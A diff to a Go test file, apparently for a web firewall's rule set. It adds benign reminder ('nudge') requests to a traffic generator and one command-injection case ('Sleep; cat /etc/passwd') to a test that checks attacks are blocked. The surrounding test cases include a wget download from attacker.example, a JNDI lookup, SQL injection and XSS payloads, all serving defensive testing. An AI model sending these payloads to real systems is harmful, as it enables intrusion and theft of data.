@@ -268,7 +268,18 @@ func (g td) requests() []tdRequest {
 		tdBody("DELETE", api+"/auth/me", map[string]any{"delete_spaces": []string{space}, "confirm_email": g.email()}),
 		{method: "POST", path: api + "/tasks/" + task + "/attachments", upload: g.pick("receipt.pdf", "IMG_2041.jpeg", "floor-plan_v2.png", "Quarterly plan (final).pdf", "Café menu – v2.jpg")},
 	}
-	return rs
+	// A habit's nudges, with a message that, as often as not, begins with a
+	// command's name.
+	message := func() string {
+		return g.pick("Sleep is worth more than one more episode", "Time to stretch", "Watch your posture!", "Kill the screen, read a chapter",
+			"Drink water (a full glass)", "Who's walking the dog?", "", g.title())
+	}
+	return append(rs,
+		tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"enabled": true, "kind": "times", "times": []string{g.clock(), g.clock()},
+			"vary": true, "message": message()}),
+		tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"enabled": true, "kind": "interval", "every_minutes": 90,
+			"window_start": "08:00", "window_end": "21:30", "vary": false, "message": message()}),
+		tdBody("POST", api+"/tasks/"+task+"/nudge/pause", map[string]any{"paused": true}))
 }
 
 // tdRoutes are the server's routes, every one, whose paths CRS reads for
@@ -718,6 +729,7 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "x && wget attacker.example/x -O /tmp/x"})},
 		{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": g.day(), "body": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 1, "note": "1' OR '1'='1' --"})},
+		{1, tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"kind": "times", "times": []string{"09:00"}, "message": "Sleep; cat /etc/passwd"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": `"><svg onload=alert(1)>`})},
 		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "<img src=x onerror=alert(1)>", "color": "moss"})},
 		{1, tdGet(api + "/search" + tdQuery("q", "x' UNION SELECT password FROM users--"))},
